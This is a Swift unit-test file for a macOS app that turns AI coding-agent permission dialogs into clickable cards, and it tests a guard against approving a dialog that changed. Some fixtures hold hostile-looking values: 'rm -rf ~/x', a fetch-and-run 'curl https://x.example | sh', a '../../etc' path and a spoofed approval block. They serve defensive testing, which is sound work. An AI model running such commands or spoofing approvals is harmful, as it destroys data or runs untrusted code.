import AppKit
import SwiftUI
import XCTest
@testable import ProsperApp

/// Claude Code Bash permission, read with dch --read from the #475 probe session.
private let bashScreen = """
⏺ I will clean the build tree and rebuild.

──────────────────────────────────────────────────────────────────────────────────────────
 Bash command

   rm -rf .build && swift build -c release
   Clean and rebuild the release products

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don't ask again for rm commands in /Users/probe/proj
   3. No, and tell Claude what to do differently (esc)
"""

/// Claude Code Edit permission with a diff preview (probe session).
private let editScreen = """
──────────────────────────────────────────────────────────────────────────────────────────
 Edit file
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  41      func tick() -> [AgentSession]? {
  42 -        let dirs = dirs()
  42 +        let dirs = self.dirs()
  43          let snap = scanner.scan(dirs)
 ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 Do you want to make this edit to AgentIslandModel.swift?
 ❯ 1. Yes
   2. Yes, allow all edits during this session (shift+tab)
   3. No, and tell Claude what to do differently (esc)
"""

/// AskUserQuestion, 4 options plus Claude's two extras (probe session).
private let askFourScreen = """
──────────────────────────────────────────────────────────────────────────────────────────
 ←  ☐ Target  ✔ Submit  →

Which deployment target?

❯ 1. Production
     Live customer traffic, needs a release tag
  2. Staging
     Pre-release environment
  3. Local only
     Docker compose on this Mac
  4. Preview
     A throwaway per-branch deploy
  5. Type something.
──────────────────────────────────────────────────────────────────────────────────────────
  6. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// Ordinary output with a numbered list and the idle input box (probe session).
private let ordinaryScreen = """
⏺ Plan:
  1. Add the parser
  2. Wire the controller
  3. Write the tests

──────────────────────────────────────────────────────────────────────────────────────────
❯
──────────────────────────────────────────────────────────────────────────────────────────
  ? for shortcuts
"""

/// codex exec approval: blocked, no numbers (probe session).
private let codexScreen = """
• Running cargo test -p core

  Allow command?

  $ cargo test -p core

  Press enter to confirm or esc to cancel
"""

/// AskUserQuestion with 3 options, written from Claude Code's form layout, with
/// the caret moved to option 2 (the user arrowed down).
private let askThreeScreen = """
────────────────────────────────────────────────
 ←  ☐ Scope  ✔ Submit  →

How far should the refactor go?

  1. Just this file
❯ 2. The whole module
     Includes the tests
  3. Everything that imports it
  4. Type something.
────────────────────────────────────────────────
  5. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// Claude Code 1.x drew the dialog in a box.
private let boxedScreen = """
╭──────────────────────────────────────────────╮
│ Bash command                                 │
│                                              │
│   git push origin main                       │
│   Push the release commit                    │
│                                              │
│ Do you want to proceed?                      │
│ ❯ 1. Yes                                     │
│   2. No, and tell Claude what to do differently (esc) │
╰──────────────────────────────────────────────╯
"""

/// Claude Code 2.1.309 Bash dialog shape, written for the K1 guard tests: the
/// same question and options for every command, only the command differs.
/// `wrap`: option 2's label wrapped onto a second line (a long allow path).
private func bash21(_ command: [String], above: String = "✻ Brewed for 5s",
                    allow: String = "/Users/probe/proj", wrap: String? = nil) -> String {
    let rule = String(repeating: "─", count: 90), dash = " " + String(repeating: "╌", count: 89)
    return ([above, "", rule, " Bash command", "", " Run the requested command", dash]
        + command.map { "   " + $0 }
        + [dash, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to \(allow)"]
        + (wrap.map { ["      " + $0] } ?? [])
        + ["   3. No", "", " Esc to cancel · Tab to amend"]).joined(separator: "\n")
}

/// A 12-line command: over the 8-line display cap.
private let longCommand = ["set -e", "cd /Users/probe/proj"] + (1...10).map { "echo step \($0)" }

/// #475 Agent Island prompt cards: the numbered-option parser on screens read
/// from a throwaway probe session, and the act-only-if-unchanged guard with an
/// injected reader, status and sender (no dch is spawned).
final class AgentIslandPromptTests: XCTestCase {
    private func prompt(_ screen: String, file: StaticString = #filePath, line: UInt = #line) throws -> AgentPrompt {
        try XCTUnwrap(AgentPrompt.parse(screen), file: file, line: line)
    }

    // MARK: - Parser

    func testBashPermission() throws {
        let p = try prompt(bashScreen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  rm -rf .build && swift build -c release",
                                   "  Clean and rebuild the release products"],
                       "inside the dialog's top rule, blank lines dropped, common indent removed")
        XCTAssertEqual(p.options, [
            AgentPromptOption(digit: 1, label: "Yes", hint: nil),
            AgentPromptOption(digit: 2, label: "Yes, and don't ask again for rm commands in /Users/probe/proj", hint: nil),
            AgentPromptOption(digit: 3, label: "No, and tell Claude what to do differently", hint: "esc"),
        ])
        XCTAssertEqual(p.options.enumerated().map { $1.style(first: $0 == 0) }, [.accent, .plain, .deny])
        XCTAssertEqual(AgentPrompt.card(screen: bashScreen), .prompt(p))
    }

    func testEditPermissionWithDiffPreview() throws {
        let p = try prompt(editScreen)
        XCTAssertEqual(p.question, "Do you want to make this edit to AgentIslandModel.swift?")
        XCTAssertEqual(p.context, ["41      func tick() -> [AgentSession]? {", "42 -        let dirs = dirs()",
                                   "42 +        let dirs = self.dirs()", "43          let snap = scanner.scan(dirs)"],
                       "the dashed rule under the diff is skipped, the one above it ends the context")
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, allow all edits during this session",
                                                "No, and tell Claude what to do differently"])
        XCTAssertEqual(p.options.map(\.hint), [nil, "shift+tab", "esc"])
    }

    func testAskUserQuestionWithFourOptions() throws {
        let p = try prompt(askFourScreen)
        XCTAssertEqual(p.question, "Which deployment target?")
        XCTAssertEqual(p.context, ["←  ☐ Target  ✔ Submit  →"])
        XCTAssertEqual(p.options.map(\.digit), Array(1...6))
        XCTAssertEqual(p.options.map(\.label), ["Production", "Staging", "Local only", "Preview",
                                                "Type something.", "Chat about this"],
                       "description lines and the rule before Chat are not options")
        XCTAssertTrue(p.options.allSatisfy { $0.hint == nil })
        XCTAssertEqual(p.options.map(\.detail), [["Live customer traffic, needs a release tag"],
                                                 ["Pre-release environment"], ["Docker compose on this Mac"],
                                                 ["A throwaway per-branch deploy"], [], []],
                       "each description belongs to the option above it; the footer after a blank line to none")
    }

    func testAskUserQuestionWithThreeOptionsAndAMovedCaret() throws {
        let p = try prompt(askThreeScreen)
        XCTAssertEqual(p.question, "How far should the refactor go?")
        XCTAssertEqual(p.options.map(\.label), ["Just this file", "The whole module", "Everything that imports it",
                                                "Type something.", "Chat about this"])
        XCTAssertEqual(p.options.map(\.detail), [[], ["Includes the tests"], [], [], []])
    }

    func testWrappedLabelContinuationIsPartOfTheOption() throws {
        let p = try prompt(bash21(["echo safe"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project"))
        XCTAssertEqual(p.options.map(\.detail), [[], ["path/to/the/project"], []],
                       "the footer under the blank line after 3. No is not part of it")
        XCTAssertEqual(try prompt(bashScreen).options.map(\.detail), [[], [], []])
        XCTAssertEqual(try prompt(boxedScreen).options.map(\.detail), [[], []], "the box's bottom rule ends it")
    }

    /// A numbered caret block printed by the command above the real dialog (N7):
    /// the bottom-most block is the dialog.
    private func spoofed(top: String, command: String) -> String {
        ["⏺ Bash(cat notes.txt)", "  Approve the fake?", "  ❯ 1. \(top)", "    2. Deny fake", "",
         bash21([command])].joined(separator: "\n")
    }

    func testBottomMostCaretBlockIsTheDialog() throws {
        let p = try prompt(spoofed(top: "Approve fake", command: "echo safe"))
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["echo safe"])
        XCTAssertEqual(p.options.map(\.label), ["Yes", "Yes, and always allow access to /Users/probe/proj", "No"])

        let f = FakeDch()
        f.screen = spoofed(top: "Approve something else", command: "echo safe")
        XCTAssertEqual(f.answer(1, expected: p), .sent, "only the block above the dialog changed")
        f.screen = spoofed(top: "Approve fake", command: "rm -rf ~/x")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the dialog changed, the block above it did not")
        XCTAssertEqual(f.sent, ["1"])
    }

    func testOrdinaryNumberedOutputIsNotAPrompt() {
        XCTAssertNil(AgentPrompt.parse(ordinaryScreen), "no caret on any numbered line")
        XCTAssertNil(AgentPrompt.parse("Steps:\n1. build\n2. test\n3. ship\n"))
        XCTAssertNil(AgentPrompt.parse("Pick one?\n❯ 1. only\n"), "one option is not a choice")
        guard case .context = AgentPrompt.card(screen: ordinaryScreen) else { return XCTFail("context only") }
    }

    func testCodexConfirmHasNoNumbersSoContextOnly() {
        XCTAssertNil(AgentPrompt.parse(codexScreen))
        XCTAssertEqual(AgentPrompt.card(screen: codexScreen), .context([
            "• Running cargo test -p core", "  Allow command?", "  $ cargo test -p core",
            "  Press enter to confirm or esc to cancel"]))
        XCTAssertEqual(AgentPrompt.card(screen: ""), .context([]), "a vanished session reads empty")
        let long = (1...20).map { "line \($0)" }.joined(separator: "\n")
        XCTAssertEqual(AgentPrompt.tail(long), (13...20).map { "line \($0)" }, "the last 8 lines")
    }

    func testOldBoxedDialog() throws {
        let p = try prompt(boxedScreen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  git push origin main", "  Push the release commit"])
        XCTAssertEqual(p.options, [AgentPromptOption(digit: 1, label: "Yes", hint: nil),
                                   AgentPromptOption(digit: 2, label: "No, and tell Claude what to do differently",
                                                     hint: "esc")])
    }

    func testMalformedListsParseAsNothing() {
        let q = "Do you want to proceed?\n"
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\n  3. No\n"), "a gap in the numbering")
        XCTAssertNil(AgentPrompt.parse(q + "  2. Yes\n❯ 3. No\n"), "does not start at 1")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\n❯ 2. No\n"), "two carets")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. [ ] Prod\n  2. [✔] Staging\n"), "multi-select: a digit toggles")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. ☐ Prod\n  2. ☐ Staging\n"))
        XCTAssertNil(AgentPrompt.parse("❯ 1. Yes\n  2. No\n"), "no question line")
        XCTAssertNil(AgentPrompt.parse(q + "❯ 1. Yes\na\nb\nc\nd\ne\n  2. No\n"), "options too far apart")
        XCTAssertNil(AgentPrompt.option("1.5 GB free"))
        XCTAssertNil(AgentPrompt.option("10. ten"), "one keystroke per click: 1-9 only")
        XCTAssertNil(AgentPrompt.option("0. zero"))
        XCTAssertNil(AgentPrompt.option("١. Arabic one"))
    }

    func testHintsAreKeysOnly() {
        XCTAssertEqual(AgentPrompt.splitHint("No (esc)").1, "esc")
        XCTAssertEqual(AgentPrompt.splitHint("Yes, allow all edits (shift+tab)").0, "Yes, allow all edits")
        XCTAssertEqual(AgentPrompt.splitHint("Local (docker)").1, nil, "a word in parentheses stays in the label")
        XCTAssertEqual(AgentPrompt.splitHint("Staging (pre-release)").0, "Staging (pre-release)")
        XCTAssertEqual(AgentPromptOption(digit: 1, label: "No", hint: nil).style(first: true), .deny, "deny wins")
        XCTAssertEqual(AgentPromptOption(digit: 2, label: "Not now", hint: nil).style(first: false), .plain)
    }

    // MARK: - Guard

    private final class FakeDch: @unchecked Sendable {
        var screen = bashScreen
        var status = "blocked\n"
        var sent: [String] = []
        var reads = 0
        let key = AgentSessionKey(dir: "/d", name: "s")
        var io: AgentPromptIO {
            AgentPromptIO(read: { [self] in XCTAssertEqual($0, key); reads += 1; return screen },
                          status: { [self] _ in status },
                          send: { [self] in XCTAssertEqual($0, key); sent.append($1) })
        }
        func answer(_ digit: Int, expected: AgentPrompt) -> AgentPromptAnswer {
            AgentPrompt.answer(key, digit: digit, expected: expected, io: io)
        }
    }

    func testUnchangedPromptSendsExactlyOneDigit() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        XCTAssertEqual(f.sent, ["2"], "the digit alone: no Enter, one keystroke")
        XCTAssertEqual(f.reads, 1, "the screen is re-read at click time")

        let ask = FakeDch()
        ask.screen = askThreeScreen
        let q = try prompt(askThreeScreen)
        ask.screen = askThreeScreen.replacingOccurrences(of: "❯ 2.", with: "  2.")
            .replacingOccurrences(of: "  3. Every", with: "❯ 3. Every")
        XCTAssertEqual(ask.answer(1, expected: q), .sent, "the caret moving is not a different prompt")
        XCTAssertEqual(ask.sent, ["1"])
    }

    func testChangedQuestionSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = bashScreen.replacingOccurrences(of: "Do you want to proceed?", with: "Do you want to continue?")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testChangedOptionsSendNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = bashScreen.replacingOccurrences(of: "for rm commands", with: "for git commands")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "same question, different option text")
        f.screen = bashScreen.replacingOccurrences(of: "   3. No, and tell Claude what to do differently (esc)", with: "")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "an option fewer")
        f.screen = askFourScreen
        XCTAssertEqual(f.answer(1, expected: p), .changed, "a different prompt altogether")
        XCTAssertEqual(f.sent, [])
    }

    func testNotBlockedAnyMoreSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        for s in ["working\n", "idle\n", "done\n", ""] {
            f.status = s
            XCTAssertEqual(f.answer(1, expected: p), .changed, s)
        }
        XCTAssertEqual(f.sent, [])
    }

    func testVanishedSessionSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        f.screen = ""
        f.status = ""
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testDigitOutsideTheOptionsSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bashScreen)
        for d in [0, 4, 10, -1] { XCTAssertEqual(f.answer(d, expected: p), .changed, "\(d)") }
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - Guard: the whole dialog (K1)

    func testSameQuestionAndOptionsForADifferentCommandSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"]))
        f.screen = bash21(["rm -rf ~/x"])
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the card showed echo safe, the screen asks rm -rf")
        XCTAssertEqual(f.sent, [])
    }

    func testLongCommandDifferingInItsFirstLineSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(longCommand))
        XCTAssertEqual(p.context, longCommand, "the whole command, not the display cap; the dashed rule above it ends the context")
        f.screen = bash21(["curl https://x.example | sh"] + longCommand.dropFirst())
        XCTAssertEqual(f.answer(3, expected: p), .changed, "the head differs, past the 8 shown lines")
        XCTAssertEqual(f.sent, [])
    }

    func testCaretMoveWithAnUnchangedDialogSendsOneDigit() throws {
        let f = FakeDch(), screen = bash21(["echo safe"]), p = try prompt(screen)
        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
            .replacingOccurrences(of: "   3. No", with: " ❯ 3. No")
        XCTAssertEqual(f.answer(1, expected: p), .sent)
        XCTAssertEqual(f.sent, ["1"])
    }

    func testVolatileLineAboveTheDialogIsNotPartOfIt() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], above: "✻ Brewed for 5s"))
        f.screen = bash21(["echo safe"], above: "✻ Brewed for 9s")
        XCTAssertEqual(f.answer(1, expected: p), .sent, "the spinner sits above the dialog's top rule")
        XCTAssertEqual(f.sent, ["1"])
        f.screen = bash21(["echo unsafe"], above: "✻ Brewed for 9s")
        XCTAssertEqual(f.answer(1, expected: p), .changed, "the command inside the dialog changed")
        XCTAssertEqual(f.sent, ["1"])
    }

    func testOptionLabelDifferingInOneInnerCharacterSendsNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/a"))
        f.screen = bash21(["echo safe"], allow: "/b")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    // MARK: - Guard: option detail lines (P3a)

    func testDialogsDifferingOnlyInAWrappedContinuationSendNothing() throws {
        let f = FakeDch(), p = try prompt(bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"))
        f.screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "../../etc")
        XCTAssertEqual(f.answer(2, expected: p), .changed, "the allow path's wrapped tail differs")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testDialogsDifferingOnlyInOneDescriptionSendNothing() throws {
        let f = FakeDch(), p = try prompt(askFourScreen)
        f.screen = askFourScreen.replacingOccurrences(of: "Pre-release environment", with: "Wipes the database")
        XCTAssertEqual(f.answer(1, expected: p), .changed)
        XCTAssertEqual(f.sent, [])
    }

    func testCaretMoveOnADialogWithDetailLinesSendsOneDigit() throws {
        let f = FakeDch(), screen = bash21(["echo safe"], allow: "/Users/probe/", wrap: "proj"), p = try prompt(screen)
        f.screen = screen.replacingOccurrences(of: " ❯ 1. Yes", with: "   1. Yes")
            .replacingOccurrences(of: "   2. Yes,", with: " ❯ 2. Yes,")
        XCTAssertEqual(f.answer(2, expected: p), .sent)
        let ask = FakeDch(), q = try prompt(askFourScreen)
        ask.screen = askFourScreen.replacingOccurrences(of: "❯ 1. Production", with: "  1. Production")
            .replacingOccurrences(of: "  4. Preview", with: "❯ 4. Preview")
        XCTAssertEqual(ask.answer(4, expected: q), .sent)
        XCTAssertEqual(f.sent + ask.sent, ["2", "4"], "exactly one digit each")
    }

    func testOverCapCardShowsTheHeadAndAMarkerAndOnlyDenyIsEnabled() throws {
        let p = try prompt(bash21(longCommand))
        XCTAssertTrue(p.isOverCap)
        XCTAssertEqual(p.shownContext, Array(longCommand.prefix(8)) + ["… 4 more lines"], "the head is shown, the tail is counted")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, [false, false, true], "approve options off, No on")
        let f = FakeDch()
        f.screen = bash21(longCommand)
        XCTAssertEqual(f.answer(1, expected: p), .changed, "a disabled option never sends")
        XCTAssertEqual(f.answer(3, expected: p), .sent)
        XCTAssertEqual(f.sent, ["3"])

        let short = try prompt(bash21(["echo safe"]))
        XCTAssertFalse(short.isOverCap)
        XCTAssertEqual(short.shownContext, short.context)
        XCTAssertTrue(short.options.allSatisfy { short.isEnabled($0) })
    }

    // MARK: - Geometry

    private let notched = AgentIslandGeometry.make(
        frame: CGRect(x: 0, y: 0, width: 1512, height: 982), visibleFrame: CGRect(x: 0, y: 0, width: 1512, height: 950),
        topLeft: CGRect(x: 0, y: 950, width: 663.5, height: 32), topRight: CGRect(x: 848.5, y: 950, width: 663.5, height: 32),
        safeTop: 32)

    func testCardHeightsAndTheIslandGrowsForThem() throws {
        let bash = AgentCard.prompt(try prompt(bashScreen))
        // 8 + 20 question + (3 * 14 + 8 + 6) context + 4 buttons * 26 + 8 + 4 gap
        XCTAssertEqual(AgentIslandGeometry.cardHeight(bash), 200)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.changed), 8 + 20 + 26 + 8 + 4)
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context([])), 8 + 26 + 8 + 4, "jump only")
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.context(["a", "b"])), 8 + (28 + 14) + 26 + 8 + 4)
        // over the cap: 8 + 20 question + (9 * 14 + 8 + 6) head + marker + 20 caption + 4 buttons * 26 + 8 + 4
        let overCap: CGFloat = 8 + 20 + (9 * 14 + 8 + 6) + 20 + 4 * 26 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(bash21(longCommand)))), overCap)
        // ask: 8 + 20 question + (1 * 14 + 8 + 6) context + 7 buttons * 26 + 4 detail lines * 14 + 8 + 4
        let ask: CGFloat = 8 + 20 + (14 + 8 + 6) + 7 * 26 + 4 * 14 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(try prompt(askFourScreen))), ask)

        XCTAssertEqual(notched.expandedSize(rows: 3, cards: 200).height, notched.expandedSize(rows: 3).height + 200,
                       "grown, not clipped")
        XCTAssertFalse(notched.listScrolls(rows: 3, cards: 200))
        XCTAssertEqual(notched.maxListHeight, 982 - 32 - 4 - 12 - 40)
        XCTAssertEqual(notched.listHeight(rows: 6, cards: 2000), notched.maxListHeight, "capped above the screen bottom")
        XCTAssertTrue(notched.listScrolls(rows: 6, cards: 2000))
        XCTAssertTrue(notched.listScrolls(rows: 7))
    }

    @MainActor
    func testStoreCountsCardsOfBlockedRowsOnly() throws {
        let store = AgentIslandStore(geometry: notched)
        let b = AgentSession(key: AgentSessionKey(dir: "/d", name: "b"), alias: "", activity: 1, state: .blocked, agents: 0)
        let w = AgentSession(key: AgentSessionKey(dir: "/d", name: "w"), alias: "", activity: 1, state: .working, agents: 0)
        store.sessions = [b, w]
        store.expanded = true
        store.cards = [b.key: .changed, w.key: .changed]
        XCTAssertEqual(store.card(for: b), .changed)
        XCTAssertNil(store.card(for: w), "a card left over on a row that stopped blocking is not shown")
        XCTAssertEqual(store.size, notched.expandedSize(rows: 2, cards: AgentIslandGeometry.cardHeight(.changed)))
    }

    // MARK: - Render (visual evidence, no window)

    @MainActor
    func testRendersBashAndAskCardsOffscreen() throws {
        let now = Date().timeIntervalSince1970
        let out = tempDir()
        let extra = ProcessInfo.processInfo.environment["PROSPER_RENDER_DIR"].map { URL(fileURLWithPath: $0) }
        for (name, alias, screen) in [("agent-island-card-bash", "clean rebuild", bashScreen),
                                      ("agent-island-card-ask", "deploy the release", askFourScreen),
                                      ("agent-island-card-overcap", "long command", bash21(longCommand)),
                                      ("agent-island-card-wrapped", "allow a long path",
                                       bash21(["swift build"], allow: "/Users/probe/a/very/long/", wrap: "path/to/the/project"))] {
            let store = AgentIslandStore(geometry: notched)
            let blocked = AgentSession(key: AgentSessionKey(dir: "/d", name: "fix-auth"), alias: alias,
                                       activity: now - 12, state: .blocked, agents: 0)
            store.sessions = [blocked,
                              AgentSession(key: AgentSessionKey(dir: "/d", name: "prosper-ios"), alias: "",
                                           activity: now - 240, state: .working, agents: 2),
                              AgentSession(key: AgentSessionKey(dir: "/d", name: "payhawk-apps"),
                                           alias: "ship release notes", activity: now - 7200, state: .done, agents: 0)]
            store.cards[blocked.key] = AgentPrompt.card(screen: screen)
            store.expanded = true
            let r = ImageRenderer(content: AgentIslandView(store: store).padding(20).background(Color(white: 0.75)))
            r.scale = 2
            let cg = try XCTUnwrap(r.cgImage, name)
            XCTAssertEqual(CGFloat(cg.width), (store.size.width + 40) * 2, name)
            XCTAssertEqual(CGFloat(cg.height), (store.size.height + 40) * 2, name)
            let png = try XCTUnwrap(NSBitmapImageRep(cgImage: cg).representation(using: .png, properties: [:]))
            try png.write(to: out.appendingPathComponent("\(name).png"))
            if let extra { try png.write(to: extra.appendingPathComponent("\(name).png")) }
        }
    }
}
